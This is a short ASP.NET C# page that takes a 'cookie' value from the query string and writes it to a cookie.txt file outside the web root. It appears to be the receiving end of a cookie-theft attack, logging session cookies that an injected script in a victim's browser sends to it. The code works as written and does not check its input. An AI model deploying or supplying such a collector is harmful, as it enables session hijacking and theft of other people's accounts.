﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.IO;

namespace myWebApplication
{
    public partial class WriteCookie1 : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            //write the input data to disk
            String cookie = Request.QueryString.Get("cookie");
            String filename = AppDomain.CurrentDomain.BaseDirectory+("\\..\\cookie.txt");
            System.IO.StreamWriter file = new System.IO.StreamWriter(filename);
            file.WriteLine(cookie);
            file.Close();

        }
    }
}